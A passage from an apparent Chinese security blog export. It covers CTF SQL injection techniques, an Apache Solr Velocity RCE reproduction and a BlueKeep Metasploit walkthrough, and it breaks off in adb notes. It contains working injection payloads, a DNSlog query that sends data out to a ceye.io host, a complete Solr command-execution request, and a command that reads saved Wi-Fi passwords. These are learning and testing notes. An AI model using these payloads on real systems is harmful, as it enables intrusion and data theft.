<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">1</span>)c1)t1 <span class="keyword">join</span> (<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">2</span>)c2)t2 <span class="keyword">join</span> (<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">3</span>)c3)t3</span><br></pre></td></tr></table></figure>
<p>结果就是下面这样</p>
<table>
<thead>
<tr>
<th align="center">c1</th>
<th align="center">c2</th>
<th align="center">c3</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">2</td>
<td align="center">3</td>
</tr>
</tbody></table>
<p>然后我们联合查询flag数据表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">1</span>)c1)t1 <span class="keyword">join</span> (<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">2</span>)c2)t2 <span class="keyword">join</span> (<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">3</span>)c3)t3 <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag <span class="keyword">where</span> id <span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p>结果如下</p>
<table>
<thead>
<tr>
<th align="center">c1</th>
<th align="center">c2</th>
<th align="center">c3</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">2</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">1</td>
<td align="center">admin</td>
<td align="center">flag{this_is_flag}</td>
</tr>
</tbody></table>
<p>现在我们把上面这个语句查询出来的表命名为t，然后我们查询这个表的c3字段,并取第二行的数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> t.c3 <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">1</span>)c1)t1 <span class="keyword">join</span> (<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">2</span>)c2)t2 <span class="keyword">join</span> (<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">3</span>)c3)t3 <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag <span class="keyword">where</span> id <span class="operator">=</span><span class="number">1</span>)t limit <span class="number">1</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p>那么我们就成功得到flag了</p>
<table>
<thead>
<tr>
<th align="center">c3</th>
</tr>
</thead>
<tbody><tr>
<td align="center">flag{this_is_flag}</td>
</tr>
</tbody></table>
<p>当然盲注我们是不能看到的，所以还需要mid或者substr进行切割，最终我们写脚本来进行未知列名的数据读取：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mid((<span class="keyword">select</span> t.c2 <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">1</span>)c1)t1 <span class="keyword">join</span> (<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">2</span>)c2)t2 <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag)t limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;f&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>从上面看我们并没有用第三列的列名但是成功把第三列的数据取了出来，这就是三联表查询。很简单吧。</p>
<h5 id="HTTP参数污染"><a href="#HTTP参数污染" class="headerlink" title="HTTP参数污染"></a>HTTP参数污染</h5><p>什么是参数污染？比如URL：<a href="http://www.xxxx.com/search.php?id=110&amp;id=911">http://www.xxxx.com/search.php?id=110&amp;id=911</a><br>百度会理解成让百度搜索：110                  #选择了第一个参数,放弃了第二个参数。<br>雅虎会理解成让雅虎搜索：911　　           #选择了第二个参数,放弃了第一个参数。<br>谷歌会理解成让谷歌搜索：110 911           #两个参数同时选择。<br>主要的就是这三种情况了。<br>这主要是源于,不同的网站对处理参数的处理方式不同<br>倘若是第三种情况,也就是第一个参数取第二个参数也取。那么大家请看下面的URL<br><a href="http://www.xishaonian.com/hello.php?id=select">http://www.xishaonian.com/hello.php?id=select</a> 1&amp;id&#x3D;2,3,3 from admin<br>该种情况还可用于Bypass WAF.</p>
<h5 id="DNSlogsql注入"><a href="#DNSlogsql注入" class="headerlink" title="DNSlogsql注入"></a>DNSlogsql注入</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(concat(<span class="string">&#x27;\\\\aa.&#x27;</span>,(<span class="keyword">select</span> database()),<span class="string">&#x27;. vd85lw.ceye.io\\abc&#x27;</span>));</span><br></pre></td></tr></table></figure>
<p>相当于访问aa.ctf.yygta1.ceye.io DNS会记录下这个记录！注意网上的payload的concat后\会把单引号转义导致那个并不好用，就上面这个就挺好用的<br>推荐的平台：<a href="http://ceye.io/">http://ceye.io/</a></p>
<h5 id="mssql-mysql"><a href="#mssql-mysql" class="headerlink" title="mssql+mysql"></a>mssql+mysql</h5><p>mssql+mysql 可以在mssql中执行mysql的查询语句：<br>参考个链接吧 没细致研究,只是见过<br><a href="https://docs.microsoft.com/zh-tw/sql/t-sql/functions/openquery-transact-sql?view=sql-server-2017">https://docs.microsoft.com/zh-tw/sql/t-sql/functions/openquery-transact-sql?view=sql-server-2017</a></p>
<h5 id="MYSQL约束攻击："><a href="#MYSQL约束攻击：" class="headerlink" title="MYSQL约束攻击："></a>MYSQL约束攻击：</h5><p>对于长度有限制的字符串如果插入超过定义的长度会自动截断：<br>比如 user列名长度10 我们注册admin admin 肯定不行，这是管理员的账户<br>如果我们注册admin+++++++++++++++ admin12345<br>那么我们仍然可以用admin12345登陆admin账号原因是+会变成空格 这在前端和都端验证中都会通过<br>例题： bugku的一道CTF题,地址:<a href="http://47.93.190.246:49163/">http://47.93.190.246:49163/</a></p>
<h5 id="mysql的弱类型-注入"><a href="#mysql的弱类型-注入" class="headerlink" title="mysql的弱类型-注入"></a>mysql的弱类型-注入</h5><p>mysql和php一样都是弱类型语言，你可以尝试select 0&#x3D;’sadas’ 结果一定是1，这里不用特殊记忆，php会返回true的mysql都会返回true，由于这种弱类型，还衍生了一点弱类型注入的技巧。<br>比如一个注册的insert 注入：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">email<span class="operator">=</span><span class="number">6677</span><span class="operator">%</span><span class="number">40</span>qq.com<span class="operator">&amp;</span>username<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;%2bsubstr((select hex(hex((select t.c from (select (select 1)c union select * from flag limit 1 offset 1)t)))) from 20)%2b&#x27;</span><span class="number">0</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">22</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>isert注入通过登录后的用户名来看回显 为了有回显 我们 0’+hex(hex(语句))+’0  由于弱类型加强制转换 我们的username就成为了我们注入数据的两次 hex值（注意这里必须用%2b +可能被当成空格或者%20 所以先编码 浏览器自己会解码这样就不会产生歧义），为什么不直接用字符串拼接呢，就像’0’+user()+’0’ ,不好意思这样只会返回0 因为”+”只适合整数相加,不适合字符串。<br>两次 hex是为了杜绝 0+33a1df+0&#x3D;33这种情况，为的是把数值变成字符开头而不是数字开头的十六进制字符串。这样我们得到的用户名就是我们查询结果的两次十六进制编码。</p>
<h5 id="同表查询"><a href="#同表查询" class="headerlink" title="同表查询"></a>同表查询</h5><p>有时候information 或者 or、select 被过滤，导致我们无法直接查询information_schema中的库名和表名。这个时候可能题目就没想让我们去information_Schema中找东西。应该尝试同表查询，还拿上面的flag表举例，如果注入语句只是查询username，那么我们可以：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> flag <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> mid(flag,<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;f&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>同表是直接可以查的，直接切就行，有时候这个技巧还听常用。</p>
<h5 id="mysql-另类攻击"><a href="#mysql-另类攻击" class="headerlink" title="mysql 另类攻击"></a>mysql 另类攻击</h5><p>有时候sql注入不是单独出现的，比如结合php的弱类型，在登陆的时候希望username返回一个null，来进行弱类型比较，那么mysql注入也可以：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> flag <span class="keyword">group</span> <span class="keyword">by</span> username <span class="keyword">with</span> <span class="keyword">rollup</span></span><br></pre></td></tr></table></figure>
<p>图形查询结果：</p>
<table>
<thead>
<tr>
<th align="center">username</th>
</tr>
</thead>
<tbody><tr>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">null</td>
</tr>
</tbody></table>
<p>可以通过limit 来返回一个null。当然这个技巧很少用。</p>
<h5 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h5><p>AllowArbitraryServer 开启的情况下开启的情况下可能存在任意文件读取，可以把本地文件读取到远程mysql服务器上，具体操作是vps启动mysql服务器用phpmyadmin的后台登陆去登陆我们的mysql服务器，我们的服务器就会记录下我们所需要的文件，当然vps的mysql服务器需要配置，主要用在phpmyadmin界面的登陆中，写起来太长了，直接给个链接吧。<br><a href="https://bbs.pediy.com/thread-248424.htm">https://bbs.pediy.com/thread-248424.htm</a></p>
<h5 id="利用数据库操作异常进行注入"><a href="#利用数据库操作异常进行注入" class="headerlink" title="利用数据库操作异常进行注入"></a>利用数据库操作异常进行注入</h5><p>有时候我们见到的题目sql语句执行不成功会报错，但是所有报错都是同样的样式，没办法通过报错注入来进行数据泄露。那么我们还可以用这种数据库异常来进行盲注（类似boolean盲注）。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 主要有以下几种玩儿法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 基于 and 的特性 0 and sql 这里的sql不会执行，因为0 and 任何 都是 0，所以不会接着执行</span></span><br><span class="line"><span class="string">&#x27;123&#x27;</span> <span class="keyword">and</span> ascii(mid(&#123;<span class="keyword">sql</span>&#125;,&#123;index&#125;,<span class="number">1</span>))<span class="operator">=</span>&#123;<span class="type">char</span>&#125; <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x)));</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 0+~0 返回一串整形数字  1+~0 报错</span></span><br><span class="line"><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> (ascii(substr((<span class="keyword">select</span> t<span class="number">.2</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">union</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> )t LIMIT <span class="number">1</span> </span><br><span class="line"><span class="keyword">OFFSET</span> <span class="number">1</span>),&#123;i&#125;,<span class="number">1</span>))<span class="operator">=</span>&#123;j&#125;)<span class="operator">+</span><span class="operator">~</span><span class="number">0</span>)#.format(i<span class="operator">=</span>i,j<span class="operator">=</span>j);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 这个是 基于and的例子 pow() 也是会报错 所以 and + 很多sql函数 都可以这样玩儿</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> admin <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> mid((<span class="keyword">select</span> username <span class="keyword">from</span> admin limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;b&#x27;</span> <span class="keyword">and</span> pow(<span class="number">222</span>,<span class="number">222222</span>);</span><br></pre></td></tr></table></figure>



<h5 id="当所有比较符号被过滤"><a href="#当所有比较符号被过滤" class="headerlink" title="当所有比较符号被过滤"></a>当所有比较符号被过滤</h5><p>记住还有 REGEXP</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">39.106</span><span class="number">.184</span><span class="number">.130</span>:<span class="number">8082</span><span class="operator">/</span>index.php?id<span class="operator">=</span><span class="number">1</span><span class="operator">^</span>(mid(length(database()),<span class="number">1</span>,<span class="number">2</span>)<span class="operator">+</span>regexp<span class="operator">+</span><span class="operator">%</span><span class="number">27</span><span class="operator">^</span><span class="number">32</span><span class="operator">%</span><span class="number">27</span>)</span><br></pre></td></tr></table></figure>

<h5 id="渗透测试中比较好用的知识点"><a href="#渗透测试中比较好用的知识点" class="headerlink" title="渗透测试中比较好用的知识点"></a>渗透测试中比较好用的知识点</h5><ul>
<li>参数污染</li>
<li>IIS 特性unicode绕过  s%u0065lect 使用hackbar编码</li>
<li>使用chunk提交数据</li>
<li>sqlserver 可以 ；号结束命令</li>
<li>mysql内联注释</li>
<li>特殊字符 %00 %0d %0a</li>
<li>空白字符<br> mysql5：OA OB OC OD AO 20<br> MSSQL:01,02 到 09，0A到0F,10到19，1A到1F,20 </li>
<li>括号绕过空格 union(select)</li>
<li>插入emoji &#x2F; 小语种文字</li>
<li>使用sqlmap tamper</li>
<li>科学计数法绕过空格 8e0union</li>
<li>无回显，无特征，善用sleep()</li>
</ul>
<h4 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h4><p>很少能打CTF了，以前打CTF竟是做注入的题，所以有很多经验，但再不总结可能就忘完了。这篇文章也不算是有技术含量，只是为CTF小白打点基础，开阔脑洞，毕竟sql注入题千变万化，越来越难了。最后希望有人能从这儿学到东西。</p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>sqli</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache solr RCE（CVE-2019-xxxx）</title>
    <url>//posts/Apache_solr_RCE/</url>
    <content><![CDATA[<p>&amp;#160; &amp;#160; &amp;#160; 记录一下复现过程，防止下次遇见的时候再去翻资料， 首先 Apache Solr是一个独立的企业级搜索应用服务器，它对外提供类似于Web-service的API接口。用户可以通过http请求，向搜索引擎服务器提交一定格式的XML文件，生成索引；也可以通过Http Get操作提出查找请求，并得到XML格式的返回结果。 Apache solr历史上有众多高危漏洞，为了自己以后遇见直接找到所有漏洞复现方式，先贴个链接： <a href="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt ">apache solr历史漏洞列表</a></p>
<span id="more"></span>

<h3 id="复现历程"><a href="#复现历程" class="headerlink" title="复现历程"></a>复现历程</h3><p>1、点击core admin 查看部署的应用的路径 （下图应用名就是dovecot）<br><img data-src="/images/pages/1572506935286.png" alt="1572506935286"></p>
<p>2、POST 下面更改config的xml 到 &#x2F;solr&#x2F;应用名&#x2F;config（比如：&#x2F;solr&#x2F;dovecot&#x2F;config）</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;update-queryresponsewriter&quot;: &#123;</span><br><span class="line">    &quot;startup&quot;: &quot;lazy&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;velocity&quot;,</span><br><span class="line">    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</span><br><span class="line">    &quot;template.base.dir&quot;: &quot;&quot;,</span><br><span class="line">    &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</span><br><span class="line">    &quot;params.resource.loader.enabled&quot;: &quot;true&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>3、请求 POC(注意编码问题，和空格问题)</p>
<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">GET /solr/master_babyartikel_Product_flop/select?q=<span class="number">1</span>&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=<span class="meta">%23set</span>(<span class="variable">$x</span>=<span class="meta">%27</span><span class="meta">%27</span>)+<span class="meta">%23set</span>(<span class="variable">$rt</span>=<span class="variable">$x</span>.class.forName(<span class="meta">%27java</span><span class="built_in">.lang</span>.Runtime<span class="meta">%27</span>))+<span class="meta">%23set</span>(<span class="variable">$chr</span>=<span class="variable">$x</span>.class.forName(<span class="meta">%27java</span><span class="built_in">.lang</span>.Character<span class="meta">%27</span>))+<span class="meta">%23set</span>(<span class="variable">$str</span>=<span class="variable">$x</span>.class.forName(<span class="meta">%27java</span><span class="built_in">.lang</span>.String<span class="meta">%27</span>))+<span class="meta">%23set</span>(<span class="variable">$ex</span>=<span class="variable">$rt</span>.getRuntime().exec(<span class="string">&#x27;id&#x27;</span>))+<span class="variable">$ex</span>.waitFor()+<span class="meta">%23set</span>(<span class="variable">$out</span>=<span class="variable">$ex</span>.getInputStream())+<span class="meta">%23foreach</span>(<span class="variable">$i</span>+<span class="keyword">in</span>+[<span class="number">1</span>..<span class="variable">$out</span>.available()])<span class="variable">$str</span>.valueOf(<span class="variable">$chr</span>.toChars(<span class="variable">$out</span>.read()))<span class="meta">%23end</span> HTTP/<span class="number">1.1</span></span><br></pre></td></tr></table></figure>

<p><img data-src="/images/pages/1572507215924.png" alt="1572507215924"></p>
<p>目前测试了 7.1 7.4 8.1 都可成功执行代码。</p>
<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p><strong>注意：</strong>1、如果第二步修改config响应403则没权限修，此时如果知道账号密码可进一步操作，如果不知道，建议放弃-哈哈。<br>&amp;#160; &amp;#160; &amp;#160; &amp;#160; &amp;#160; 2、如果响应500可能存在的情况就是你的包出现了问题，再次检查请求包是否正确，如果正确则可能是solr的服务损坏。<br>&amp;#160; &amp;#160; &amp;#160; &amp;#160; &amp;#160; 3、如果返回200也别太高兴，看看响应有没有error。没有error即可进行第三步，即命令执行POC。<br>&amp;#160; &amp;#160; &amp;#160; &amp;#160; &amp;#160; 4、第二步成功的情况下，第三步绝大多数都可以成功，但是有的可能会返回xml，400，等一系列不正常的信息，这时候去看一下config - <a href="http://x.x.x.x:8080/solr/%E5%BA%94%E7%94%A8%E5%90%8D/config">http://x.x.x.x:8080/solr/应用名/config</a> 查看配置是否真的被你在第二步更改了（搜索velocity 看前后是否是你POST修改的josn）。如果没有则重做第二步。</p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>apache</tag>
      </tags>
  </entry>
  <entry>
    <title>MS2019_0708复现笔记</title>
    <url>//posts/MS2019_0708%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h2><p>windows7：<br><img data-src="/images/pages/1568125420978.png" alt="1568125420978"></p>
<p>kali2019：这里就不截图了，就是kali2019，因为听说msf的版本必须大于5.0，懒得升级直接重装kali</p>
<p>备注：windows7 目前只能复现旗舰版的sp1 如果总是遇见蓝屏请把win7虚拟机调成2G2核。另外安装虚拟机的时候记得选择ultimate，否则虚拟机默认安装家庭版，这个很重要。</p>
<span id="more"></span>
<h2 id="先搞好MSF"><a href="#先搞好MSF" class="headerlink" title="先搞好MSF"></a>先搞好MSF</h2><p>首先我们要下载网上的msf rb脚本，我这里是从github一个老哥那儿下载的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rb</span><br><span class="line"></span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line"></span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br><span class="line"></span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br></pre></td></tr></table></figure>
<p>网上还有另一个脚本下载地址：<a href="https://github.com/backlion/demo/raw/master/CVE-2019-0708_RDP%20_MSF.zip">https://github.com/backlion/demo/raw/master/CVE-2019-0708_RDP%20_MSF.zip</a> 这里的这个我也用了，但是一直不成功，后来我就去下载了上面的那个。也可能是我没搞好路径覆盖吧，我还是推荐用我下载的那个。  </p>
<p>下面就是把上面下载的四个脚本放进msf，如果你是自己安装的msf，你的msf 应该在&#x2F;opt 目录下，如果是自带的应该在&#x2F;usr&#x2F;share&#x2F;<br>我的是自带的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">替换文件：</span><br><span class="line">cve_2019_0708_bluekeep_rce.rb   替换  /usr/share/metasploit</span><br><span class="line">framework/modules/exploit/windows/rdp/</span><br><span class="line"></span><br><span class="line">rdp.rb   替换  /usr/share/metasploit-framework/lib/msf/core/exploit/rdp.rb</span><br><span class="line"></span><br><span class="line">rdp_scanner.rb 替换  /usr/share//metasploit</span><br><span class="line">framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line"></span><br><span class="line">cve_2019_0708_bluekeep.rb 替换 /usr/share/metasploit</span><br><span class="line">framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br></pre></td></tr></table></figure>
<p>如果你是自己下载的，同理：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> rdp.rb /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/</span><br><span class="line"></span><br><span class="line"><span class="built_in">cp</span> rdp_scanner.rb /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/</span><br><span class="line"></span><br><span class="line"><span class="comment">#如果这里没有rdp目录，就创建一个rdp目录</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cp</span> cve_2019_0708_bluekeep_rce.rb /opt/metasploit-framework/embedded/framework/modules/exploits/rdp/</span><br><span class="line"></span><br><span class="line"><span class="built_in">cp</span> cve_2019_0708_bluekeep.rb /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/</span><br></pre></td></tr></table></figure>
<h4 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h4><p>首先保证能ping通win7 虚拟机（靶机），然后关闭win7的防火墙（没错，目前就是这么鸡肋），开启win7的远程桌面，这个就不用教了吧。<br>靶机：192.168.26.159<br>攻击机：192.168.26.180<br>开启msfconsole，执行 reload_all。<br>然后  search cve_2019_0708_bluekeep_rce 看看是否覆盖进去了。<br>紧接着 use exploit&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce 加载模块，然后设置三个参数：<br>RHOSTS 靶机ip<br>RPORT rdp端口<br>target ID数字(可选为0-4)设置受害机机器架构<br>PS：我是set target 3 成功的</p>
<p>千万不要自作聪明去改RDP_CLIENT_IP 这个默认就行。<br>然后就是 run 这个时候你就可以看到蓝屏或者就是shell回来了：<img data-src="/images/pages/1568126952731.png" alt="1568126952731"></p>
<p>蓝屏不要紧，蓝屏很正常，再试几次。</p>
<p><img data-src="/images/pages/1568126937511.png" alt="1568126937511"></p>
<p>上面我们成功返回shell，当然中间可能还会各种遇到报错，所以你也遇到了请接着往下看</p>
<h2 id="报错解决"><a href="#报错解决" class="headerlink" title="报错解决"></a>报错解决</h2><p>1、如果报错：</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">Exploit failed: NameError undefined <span class="built_in">local</span> variable ormethod rdp_ connect&#x27; <span class="keyword">for</span> #&lt;Msf : :Modules: :Exploit__ Rdp_ Cve_ <span class="number">2019</span> <span class="number">0708</span> bluekeep_ rce: :Metasploi tModule : <span class="number">0x000000000f</span> <span class="number">702b78</span>&gt;</span><br></pre></td></tr></table></figure>
<p>说明你的四个payload文件没有覆盖到正确的位置，请一一确认，这个问题不解决是绝对不可能打过去的<br>2、如果报错：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Exploit</span> completed, but <span class="literal">no</span> session was created.</span><br></pre></td></tr></table></figure>
<p>恭喜你，打过去了，但是大概率是蓝屏了，如果蓝屏说明你是对的再多试几次，并且更换target多试几次，确实很大几率是蓝屏。如果没有蓝屏但是也报错如上，那么就是你的虚拟机版本的问题，请确认 关闭防火墙、开启3389 版本 window7 sp1 版本。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>目前这个0708漏洞算是可以利用了，但是仍需要大佬开发更稳定的脚本出来，而我是搞web的，我根本改不动这个东西，看来以后得多学学逆向了。</p>
]]></content>
      <categories>
        <category>内网安全</category>
      </categories>
      <tags>
        <tag>ms2019_0708</tag>
      </tags>
  </entry>
  <entry>
    <title>adb工具的使用笔记</title>
    <url>//posts/adb%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>由于所在部门是金融行业的安全服务部门，所以很多时候都要进行银行、金融业的渗透测试，其中很多都是小程序、app等移动端应用。所以adb是必须要掌握的，我以前也从来没玩儿过andriod，但是还是迫于业务需求，自己学了一段时间。后来我想如果写出来可能更有条理些，自己也能复习一遍。所以就写了这篇。<br>这篇文章没啥技术难点，甚至它只是我的个人笔记。我讲述下我在工作中是怎么用adb的，后面如果有时间我也会写写frida,当然frida就复杂的多了。下面还是看看adb这个工具吧。<span id="more"></span></p>
<h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>ADB是 Android 开发&#x2F;测试人员不可替代的强大工具，也是 Android 设备玩家的一个玩具。如果你观察仔细，很多刷机、刷系统的软件都是用的adb来进行操作的，这也就是为什么他们直接插上USB并打开USB调试功能就能刷机、安装等等。但是如果权限过高，刷机软件也是可以给你装点不可见的应用的。所以还是慎重用刷机软件吧！</p>
<h4 id="直接上手"><a href="#直接上手" class="headerlink" title="直接上手"></a>直接上手</h4><p>下载ADB直接去官网下载：<a href="https://developer.android.com/studio/releases/platform-tools.html">https://developer.android.com/studio/releases/platform-tools.html</a><br>选择合适的系统下载就行了，然后环境变量想配就配，无所谓的东西，反正你也可以直接到目录下运行adb。</p>
<p>adb支持两种连接方式：USB 和 wifi（不常用）<br>能用USB还是用USB吧wifi 有时候会出问题 我从来不用。<br>下面直接找个root手机，我手里的是   魅族s6 : andriod7.0 还是建议用真机，模拟器总是出一堆问题。没钱买测试机的当我没说。<br>连接USB（一端手机，一端电脑） 打开USB的调试模式（在设置里面，但具体位置每个手机不一样），然后打开adb所在目录命令行直接运行adb shell (这是你只插一台手机的情况)。<br>如果你插了多台手机你可以：</p>
<ul>
<li><p>adb devices  &#x2F;&#x2F;看下都是哪几个手机 哪几个编号</p>
</li>
<li><p>adb -s b21b8569 shell  &#x2F;&#x2F;指定设备号进入shell</p>
</li>
<li><p>adb shell + 命令 &#x2F;&#x2F;这样就不用每次进入交互了，直接执行命令。</p>
</li>
</ul>
<p>PS：有时候会出现找不到手机的情况，这时候如果你已经开启了USB调试并且手机也是ROOT权限，那么就是adb的配置问题了，直接在C:\Users&lt;用户名&gt;.android\adb_usb.ini中添加一行:0x2a45<br>,然后在cmd中执行  adb kill-server    adb start-server    adb devices 就可以看到设备了。其它操作系统同理</p>
<p>ok 现在你可以whoami看下，一般都是普通权限，直接su就是root了。如果你需要把文件copy出来，首先不要直接copy，先把文件放到 &#x2F;data&#x2F;local&#x2F;tmp 目录下，这是一个临时目录，是我的很多同事都用来存文件的目录。记住它，嗯。然后：</p>
<ul>
<li>chmod 777 文件名 &#x2F;&#x2F;加权限 要不然脱不下来 即便他是临时目录也是要权限的啊。</li>
<li>adb pull   手机路径 电脑路径   &#x2F;&#x2F;把手机路径的文件拉到电脑路径下  </li>
<li>adb push 电脑路径 手机路径  &#x2F;&#x2F;和上面相反   注意斜杠不相同（windows和linux）</li>
</ul>
<p>PS：很多时候要认证看报错，而不是盲目去百度。脱不下来传不上去很多都是权限问题。</p>
<p>一般我们不需要启动停止ADB服务，除非你手欠，或者就是要重启，请：</p>
<ul>
<li>adb kill-server</li>
<li>adb start-server</li>
</ul>
<p>每次进入命令行都需要su 是不是很烦？没事我们可以解决：</p>
<ul>
<li>adb root  &#x2F;&#x2F;直接root 启动adb 以后adb shell 直接就是 root权限了</li>
</ul>
<p>有时候我们的端口可能正在被占用，这时候就需要修改adb的端口：</p>
<ul>
<li>adb -P <port> start-server   &#x2F;&#x2F;默认是5037 一般都不会占用的</li>
</ul>
<p>有时候我们需要看一下app的包是哪个方便我们进行hook：</p>
<ul>
<li>adb shell pm list packages  &#x2F;&#x2F;列出当前所有运行中的包</li>
</ul>
<p>安装&#x2F;卸载apk：</p>
<ul>
<li>adb install 1.apk  &#x2F;&#x2F;有时候手机会弹窗、需要点确认。</li>
<li>adb uninstall 1.apk</li>
</ul>
<p>好玩儿的一些操作手机的指令：</p>
<ul>
<li>cat &#x2F;data&#x2F;misc&#x2F;wifi&#x2F;*.conf &#x2F;&#x2F;查看连接过的wifi密码</li>
